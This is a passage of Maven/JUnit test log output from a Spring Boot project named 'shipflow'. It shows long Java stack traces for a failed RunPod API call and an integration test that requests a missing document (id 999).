	at org.junit.platform.launcher.core.EngineExecutionOrchestrator.execute(EngineExecutionOrchestrator.java:169) ~[junit-platform-launcher-1.10.1.jar:1.10.1]
	at org.junit.platform.launcher.core.EngineExecutionOrchestrator.execute(EngineExecutionOrchestrator.java:93) ~[junit-platform-launcher-1.10.1.jar:1.10.1]
	at org.junit.platform.launcher.core.EngineExecutionOrchestrator.lambda$execute$0(EngineExecutionOrchestrator.java:58) ~[junit-platform-launcher-1.10.1.jar:1.10.1]
	at org.junit.platform.launcher.core.EngineExecutionOrchestrator.withInterceptedStreams(EngineExecutionOrchestrator.java:141) ~[junit-platform-launcher-1.10.1.jar:1.10.1]
	at org.junit.platform.launcher.core.EngineExecutionOrchestrator.execute(EngineExecutionOrchestrator.java:57) ~[junit-platform-launcher-1.10.1.jar:1.10.1]
	at org.junit.platform.launcher.core.DefaultLauncher.execute(DefaultLauncher.java:103) ~[junit-platform-launcher-1.10.1.jar:1.10.1]
	at org.junit.platform.launcher.core.DefaultLauncher.execute(DefaultLauncher.java:85) ~[junit-platform-launcher-1.10.1.jar:1.10.1]
	at org.junit.platform.launcher.core.DelegatingLauncher.execute(DelegatingLauncher.java:47) ~[junit-platform-launcher-1.10.1.jar:1.10.1]
	at org.apache.maven.surefire.junitplatform.LazyLauncher.execute(LazyLauncher.java:56) ~[surefire-junit-platform-3.1.2.jar:3.1.2]
	at org.apache.maven.surefire.junitplatform.JUnitPlatformProvider.execute(JUnitPlatformProvider.java:184) ~[surefire-junit-platform-3.1.2.jar:3.1.2]
	at org.apache.maven.surefire.junitplatform.JUnitPlatformProvider.invokeAllTests(JUnitPlatformProvider.java:148) ~[surefire-junit-platform-3.1.2.jar:3.1.2]
	at org.apache.maven.surefire.junitplatform.JUnitPlatformProvider.invoke(JUnitPlatformProvider.java:122) ~[surefire-junit-platform-3.1.2.jar:3.1.2]
	at org.apache.maven.surefire.booter.ForkedBooter.runSuitesInProcess(ForkedBooter.java:385) ~[surefire-booter-3.1.2.jar:3.1.2]
	at org.apache.maven.surefire.booter.ForkedBooter.execute(ForkedBooter.java:162) ~[surefire-booter-3.1.2.jar:3.1.2]
	at org.apache.maven.surefire.booter.ForkedBooter.run(ForkedBooter.java:507) ~[surefire-booter-3.1.2.jar:3.1.2]
	at org.apache.maven.surefire.booter.ForkedBooter.main(ForkedBooter.java:495) ~[surefire-booter-3.1.2.jar:3.1.2]
Caused by: java.lang.RuntimeException: RunPod /run failed with status 500: {"messageKey":"error.generic","message":"An unexpected error occurred. Please try again.","timestamp":"2026-01-17T23:26:45.001228","status":500}
	at com.github.farzadsedaghatbin.shipflow.config.RunPodChatModel.submitJob(RunPodChatModel.java:128) ~[classes/:na]
	at com.github.farzadsedaghatbin.shipflow.config.RunPodChatModel.generate(RunPodChatModel.java:81) ~[classes/:na]
	... 197 common frames omitted

2026-01-17T23:26:45.010Z ERROR 89700 --- [shipflow] [           main] c.g.f.s.controller.DocumentController    : Error linking document to pitch: Document not found: 999

java.lang.RuntimeException: Document not found: 999
	at com.github.farzadsedaghatbin.shipflow.service.DocumentService.lambda$0(DocumentService.java:287) ~[classes/:na]
	at java.base/java.util.Optional.orElseThrow(Optional.java:403) ~[na:na]
	at com.github.farzadsedaghatbin.shipflow.service.DocumentService.getDocumentById(DocumentService.java:287) ~[classes/:na]
	at com.github.farzadsedaghatbin.shipflow.service.DocumentService.linkDocumentToEntity(DocumentService.java:350) ~[classes/:na]
	at java.base/jdk.internal.reflect.DirectMethodHandleAccessor.invoke(DirectMethodHandleAccessor.java:103) ~[na:na]
	at java.base/java.lang.reflect.Method.invoke(Method.java:580) ~[na:na]
	at org.springframework.aop.support.AopUtils.invokeJoinpointUsingReflection(AopUtils.java:352) ~[spring-aop-6.1.2.jar:6.1.2]
	at org.springframework.aop.framework.ReflectiveMethodInvocation.invokeJoinpoint(ReflectiveMethodInvocation.java:196) ~[spring-aop-6.1.2.jar:6.1.2]
	at org.springframework.aop.framework.ReflectiveMethodInvocation.proceed(ReflectiveMethodInvocation.java:163) ~[spring-aop-6.1.2.jar:6.1.2]
	at org.springframework.aop.framework.CglibAopProxy$CglibMethodInvocation.proceed(CglibAopProxy.java:765) ~[spring-aop-6.1.2.jar:6.1.2]
	at org.springframework.transaction.interceptor.TransactionInterceptor$1.proceedWithInvocation(TransactionInterceptor.java:123) ~[spring-tx-6.1.2.jar:6.1.2]
	at org.springframework.transaction.interceptor.TransactionAspectSupport.invokeWithinTransaction(TransactionAspectSupport.java:385) ~[spring-tx-6.1.2.jar:6.1.2]
	at org.springframework.transaction.interceptor.TransactionInterceptor.invoke(TransactionInterceptor.java:119) ~[spring-tx-6.1.2.jar:6.1.2]
	at org.springframework.aop.framework.ReflectiveMethodInvocation.proceed(ReflectiveMethodInvocation.java:184) ~[spring-aop-6.1.2.jar:6.1.2]
	at org.springframework.aop.framework.CglibAopProxy$CglibMethodInvocation.proceed(CglibAopProxy.java:765) ~[spring-aop-6.1.2.jar:6.1.2]
	at org.springframework.aop.framework.CglibAopProxy$DynamicAdvisedInterceptor.intercept(CglibAopProxy.java:717) ~[spring-aop-6.1.2.jar:6.1.2]
	at com.github.farzadsedaghatbin.shipflow.service.DocumentService$$SpringCGLIB$$0.linkDocumentToEntity(<generated>) ~[classes/:na]
	at com.github.farzadsedaghatbin.shipflow.controller.DocumentController.linkDocumentToPitch(DocumentController.java:305) ~[classes/:na]
	at java.base/jdk.internal.reflect.DirectMethodHandleAccessor.invoke(DirectMethodHandleAccessor.java:103) ~[na:na]
	at java.base/java.lang.reflect.Method.invoke(Method.java:580) ~[na:na]
	at org.springframework.web.method.support.InvocableHandlerMethod.doInvoke(InvocableHandlerMethod.java:262) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.web.method.support.InvocableHandlerMethod.invokeForRequest(InvocableHandlerMethod.java:190) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.web.servlet.mvc.method.annotation.ServletInvocableHandlerMethod.invokeAndHandle(ServletInvocableHandlerMethod.java:118) ~[spring-webmvc-6.1.2.jar:6.1.2]
	at org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerAdapter.invokeHandlerMethod(RequestMappingHandlerAdapter.java:917) ~[spring-webmvc-6.1.2.jar:6.1.2]
	at org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerAdapter.handleInternal(RequestMappingHandlerAdapter.java:829) ~[spring-webmvc-6.1.2.jar:6.1.2]
	at org.springframework.web.servlet.mvc.method.AbstractHandlerMethodAdapter.handle(AbstractHandlerMethodAdapter.java:87) ~[spring-webmvc-6.1.2.jar:6.1.2]
	at org.springframework.web.servlet.DispatcherServlet.doDispatch(DispatcherServlet.java:1089) ~[spring-webmvc-6.1.2.jar:6.1.2]
	at org.springframework.web.servlet.DispatcherServlet.doService(DispatcherServlet.java:979) ~[spring-webmvc-6.1.2.jar:6.1.2]
	at org.springframework.web.servlet.FrameworkServlet.processRequest(FrameworkServlet.java:1014) ~[spring-webmvc-6.1.2.jar:6.1.2]
	at org.springframework.web.servlet.FrameworkServlet.doPut(FrameworkServlet.java:925) ~[spring-webmvc-6.1.2.jar:6.1.2]
	at jakarta.servlet.http.HttpServlet.service(HttpServlet.java:593) ~[tomcat-embed-core-10.1.17.jar:6.0]
	at org.springframework.web.servlet.FrameworkServlet.service(FrameworkServlet.java:885) ~[spring-webmvc-6.1.2.jar:6.1.2]
	at org.springframework.test.web.servlet.TestDispatcherServlet.service(TestDispatcherServlet.java:72) ~[spring-test-6.1.2.jar:6.1.2]
	at jakarta.servlet.http.HttpServlet.service(HttpServlet.java:658) ~[tomcat-embed-core-10.1.17.jar:6.0]
	at org.springframework.mock.web.MockFilterChain$ServletFilterProxy.doFilter(MockFilterChain.java:165) ~[spring-test-6.1.2.jar:6.1.2]
	at org.springframework.mock.web.MockFilterChain.doFilter(MockFilterChain.java:132) ~[spring-test-6.1.2.jar:6.1.2]
	at com.github.farzadsedaghatbin.shipflow.security.MaliciousHeaderFilter.doFilter(MaliciousHeaderFilter.java:83) ~[classes/:na]
	at org.springframework.test.web.servlet.setup.MockMvcFilterDecorator.doFilter(MockMvcFilterDecorator.java:151) ~[spring-test-6.1.2.jar:6.1.2]
	at org.springframework.mock.web.MockFilterChain.doFilter(MockFilterChain.java:132) ~[spring-test-6.1.2.jar:6.1.2]
	at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:110) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.test.web.servlet.setup.MockMvcFilterDecorator.doFilter(MockMvcFilterDecorator.java:151) ~[spring-test-6.1.2.jar:6.1.2]
	at org.springframework.mock.web.MockFilterChain.doFilter(MockFilterChain.java:132) ~[spring-test-6.1.2.jar:6.1.2]
	at org.springframework.web.filter.CompositeFilter$VirtualFilterChain.doFilter(CompositeFilter.java:108) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.security.web.FilterChainProxy.lambda$doFilterInternal$3(FilterChainProxy.java:231) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$FilterObservation$SimpleFilterObservation.lambda$wrap$1(ObservationFilterChainDecorator.java:479) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$AroundFilterObservation$SimpleAroundFilterObservation.lambda$wrap$1(ObservationFilterChainDecorator.java:340) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator.lambda$wrapSecured$0(ObservationFilterChainDecorator.java:82) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$VirtualFilterChain.doFilter(ObservationFilterChainDecorator.java:128) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.access.intercept.AuthorizationFilter.doFilter(AuthorizationFilter.java:100) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.wrapFilter(ObservationFilterChainDecorator.java:240) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.doFilter(ObservationFilterChainDecorator.java:227) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$VirtualFilterChain.doFilter(ObservationFilterChainDecorator.java:137) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.access.ExceptionTranslationFilter.doFilter(ExceptionTranslationFilter.java:126) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.access.ExceptionTranslationFilter.doFilter(ExceptionTranslationFilter.java:120) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.wrapFilter(ObservationFilterChainDecorator.java:240) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.doFilter(ObservationFilterChainDecorator.java:227) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$VirtualFilterChain.doFilter(ObservationFilterChainDecorator.java:137) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.session.SessionManagementFilter.doFilter(SessionManagementFilter.java:131) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.session.SessionManagementFilter.doFilter(SessionManagementFilter.java:85) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.wrapFilter(ObservationFilterChainDecorator.java:240) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.doFilter(ObservationFilterChainDecorator.java:227) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$VirtualFilterChain.doFilter(ObservationFilterChainDecorator.java:137) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.authentication.AnonymousAuthenticationFilter.doFilter(AnonymousAuthenticationFilter.java:100) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.wrapFilter(ObservationFilterChainDecorator.java:240) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.doFilter(ObservationFilterChainDecorator.java:227) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$VirtualFilterChain.doFilter(ObservationFilterChainDecorator.java:137) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.servletapi.SecurityContextHolderAwareRequestFilter.doFilter(SecurityContextHolderAwareRequestFilter.java:179) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.wrapFilter(ObservationFilterChainDecorator.java:240) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.doFilter(ObservationFilterChainDecorator.java:227) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$VirtualFilterChain.doFilter(ObservationFilterChainDecorator.java:137) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.savedrequest.RequestCacheAwareFilter.doFilter(RequestCacheAwareFilter.java:63) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.wrapFilter(ObservationFilterChainDecorator.java:240) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.doFilter(ObservationFilterChainDecorator.java:227) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$VirtualFilterChain.doFilter(ObservationFilterChainDecorator.java:137) ~[spring-security-web-6.2.1.jar:6.2.1]
	at com.github.farzadsedaghatbin.shipflow.security.JwtAuthenticationFilter.doFilterInternal(JwtAuthenticationFilter.java:46) ~[classes/:na]
	at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:116) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.wrapFilter(ObservationFilterChainDecorator.java:240) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.doFilter(ObservationFilterChainDecorator.java:227) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$VirtualFilterChain.doFilter(ObservationFilterChainDecorator.java:137) ~[spring-security-web-6.2.1.jar:6.2.1]
	at com.github.farzadsedaghatbin.shipflow.security.MaliciousHeaderFilter.doFilter(MaliciousHeaderFilter.java:83) ~[classes/:na]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.wrapFilter(ObservationFilterChainDecorator.java:240) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.doFilter(ObservationFilterChainDecorator.java:227) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$VirtualFilterChain.doFilter(ObservationFilterChainDecorator.java:137) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.authentication.logout.LogoutFilter.doFilter(LogoutFilter.java:107) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.authentication.logout.LogoutFilter.doFilter(LogoutFilter.java:93) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.wrapFilter(ObservationFilterChainDecorator.java:240) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.doFilter(ObservationFilterChainDecorator.java:227) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$VirtualFilterChain.doFilter(ObservationFilterChainDecorator.java:137) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.web.filter.CorsFilter.doFilterInternal(CorsFilter.java:91) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:116) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.wrapFilter(ObservationFilterChainDecorator.java:240) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.doFilter(ObservationFilterChainDecorator.java:227) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$VirtualFilterChain.doFilter(ObservationFilterChainDecorator.java:137) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.header.HeaderWriterFilter.doHeadersAfter(HeaderWriterFilter.java:90) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.header.HeaderWriterFilter.doFilterInternal(HeaderWriterFilter.java:75) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:116) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.wrapFilter(ObservationFilterChainDecorator.java:240) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.doFilter(ObservationFilterChainDecorator.java:227) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$VirtualFilterChain.doFilter(ObservationFilterChainDecorator.java:137) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.context.SecurityContextHolderFilter.doFilter(SecurityContextHolderFilter.java:82) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.context.SecurityContextHolderFilter.doFilter(SecurityContextHolderFilter.java:69) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.wrapFilter(ObservationFilterChainDecorator.java:240) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.doFilter(ObservationFilterChainDecorator.java:227) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$VirtualFilterChain.doFilter(ObservationFilterChainDecorator.java:137) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.context.request.async.WebAsyncManagerIntegrationFilter.doFilterInternal(WebAsyncManagerIntegrationFilter.java:62) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:116) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.wrapFilter(ObservationFilterChainDecorator.java:240) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.doFilter(ObservationFilterChainDecorator.java:227) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$VirtualFilterChain.doFilter(ObservationFilterChainDecorator.java:137) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.session.DisableEncodeUrlFilter.doFilterInternal(DisableEncodeUrlFilter.java:42) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:116) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.wrapFilter(ObservationFilterChainDecorator.java:240) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$AroundFilterObservation$SimpleAroundFilterObservation.lambda$wrap$0(ObservationFilterChainDecorator.java:323) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.doFilter(ObservationFilterChainDecorator.java:224) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$VirtualFilterChain.doFilter(ObservationFilterChainDecorator.java:137) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.FilterChainProxy.doFilterInternal(FilterChainProxy.java:233) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.FilterChainProxy.doFilter(FilterChainProxy.java:191) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.web.filter.CompositeFilter$VirtualFilterChain.doFilter(CompositeFilter.java:113) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.web.servlet.handler.HandlerMappingIntrospector.lambda$createCacheFilter$3(HandlerMappingIntrospector.java:195) ~[spring-webmvc-6.1.2.jar:6.1.2]
	at org.springframework.web.filter.CompositeFilter$VirtualFilterChain.doFilter(CompositeFilter.java:113) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.web.filter.CompositeFilter.doFilter(CompositeFilter.java:74) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.security.config.annotation.web.configuration.WebMvcSecurityConfiguration$CompositeFilterChainProxy.doFilter(WebMvcSecurityConfiguration.java:225) ~[spring-security-config-6.2.1.jar:6.2.1]
	at org.springframework.web.filter.DelegatingFilterProxy.invokeDelegate(DelegatingFilterProxy.java:352) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.web.filter.DelegatingFilterProxy.doFilter(DelegatingFilterProxy.java:268) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.test.web.servlet.setup.MockMvcFilterDecorator.doFilter(MockMvcFilterDecorator.java:151) ~[spring-test-6.1.2.jar:6.1.2]
	at org.springframework.mock.web.MockFilterChain.doFilter(MockFilterChain.java:132) ~[spring-test-6.1.2.jar:6.1.2]
	at org.springframework.web.filter.RequestContextFilter.doFilterInternal(RequestContextFilter.java:100) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:116) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.test.web.servlet.setup.MockMvcFilterDecorator.doFilter(MockMvcFilterDecorator.java:151) ~[spring-test-6.1.2.jar:6.1.2]
	at org.springframework.mock.web.MockFilterChain.doFilter(MockFilterChain.java:132) ~[spring-test-6.1.2.jar:6.1.2]
	at org.springframework.web.filter.FormContentFilter.doFilterInternal(FormContentFilter.java:93) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:116) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.test.web.servlet.setup.MockMvcFilterDecorator.doFilter(MockMvcFilterDecorator.java:151) ~[spring-test-6.1.2.jar:6.1.2]
	at org.springframework.mock.web.MockFilterChain.doFilter(MockFilterChain.java:132) ~[spring-test-6.1.2.jar:6.1.2]
	at org.springframework.web.filter.ServerHttpObservationFilter.doFilterInternal(ServerHttpObservationFilter.java:109) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:116) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.test.web.servlet.setup.MockMvcFilterDecorator.doFilter(MockMvcFilterDecorator.java:151) ~[spring-test-6.1.2.jar:6.1.2]
	at org.springframework.mock.web.MockFilterChain.doFilter(MockFilterChain.java:132) ~[spring-test-6.1.2.jar:6.1.2]
	at org.springframework.web.filter.CharacterEncodingFilter.doFilterInternal(CharacterEncodingFilter.java:201) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:116) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.test.web.servlet.setup.MockMvcFilterDecorator.doFilter(MockMvcFilterDecorator.java:151) ~[spring-test-6.1.2.jar:6.1.2]
	at org.springframework.mock.web.MockFilterChain.doFilter(MockFilterChain.java:132) ~[spring-test-6.1.2.jar:6.1.2]
	at org.springframework.test.web.servlet.MockMvc.perform(MockMvc.java:201) ~[spring-test-6.1.2.jar:6.1.2]
	at com.github.farzadsedaghatbin.shipflow.controller.DocumentControllerIntegrationTest.linkDocumentToPitch_withInvalidDocumentId_shouldReturnBadRequest(DocumentControllerIntegrationTest.java:329) ~[test-classes/:na]
	at java.base/jdk.internal.reflect.DirectMethodHandleAccessor.invoke(DirectMethodHandleAccessor.java:103) ~[na:na]
	at java.base/java.lang.reflect.Method.invoke(Method.java:580) ~[na:na]
	at org.junit.platform.commons.util.ReflectionUtils.invokeMethod(ReflectionUtils.java:728) ~[junit-platform-commons-1.10.1.jar:1.10.1]
	at org.junit.jupiter.engine.execution.MethodInvocation.proceed(MethodInvocation.java:60) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.execution.InvocationInterceptorChain$ValidatingInvocation.proceed(InvocationInterceptorChain.java:131) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.extension.TimeoutExtension.intercept(TimeoutExtension.java:156) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.extension.TimeoutExtension.interceptTestableMethod(TimeoutExtension.java:147) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.extension.TimeoutExtension.interceptTestMethod(TimeoutExtension.java:86) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.execution.InterceptingExecutableInvoker$ReflectiveInterceptorCall.lambda$ofVoidMethod$0(InterceptingExecutableInvoker.java:103) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.execution.InterceptingExecutableInvoker.lambda$invoke$0(InterceptingExecutableInvoker.java:93) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.execution.InvocationInterceptorChain$InterceptedInvocation.proceed(InvocationInterceptorChain.java:106) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.execution.InvocationInterceptorChain.proceed(InvocationInterceptorChain.java:64) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.execution.InvocationInterceptorChain.chainAndInvoke(InvocationInterceptorChain.java:45) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.execution.InvocationInterceptorChain.invoke(InvocationInterceptorChain.java:37) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.execution.InterceptingExecutableInvoker.invoke(InterceptingExecutableInvoker.java:92) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.execution.InterceptingExecutableInvoker.invoke(InterceptingExecutableInvoker.java:86) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.descriptor.TestMethodTestDescriptor.lambda$invokeTestMethod$7(TestMethodTestDescriptor.java:218) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.jupiter.engine.descriptor.TestMethodTestDescriptor.invokeTestMethod(TestMethodTestDescriptor.java:214) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.descriptor.TestMethodTestDescriptor.execute(TestMethodTestDescriptor.java:139) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.descriptor.TestMethodTestDescriptor.execute(TestMethodTestDescriptor.java:69) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$6(NodeTestTask.java:151) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$8(NodeTestTask.java:141) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.Node.around(Node.java:137) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$9(NodeTestTask.java:139) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.executeRecursively(NodeTestTask.java:138) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.execute(NodeTestTask.java:95) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at java.base/java.util.ArrayList.forEach(ArrayList.java:1596) ~[na:na]
	at org.junit.platform.engine.support.hierarchical.SameThreadHierarchicalTestExecutorService.invokeAll(SameThreadHierarchicalTestExecutorService.java:41) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$6(NodeTestTask.java:155) ~[junit-platform-engine-1.10.1.jar:1.10.1]
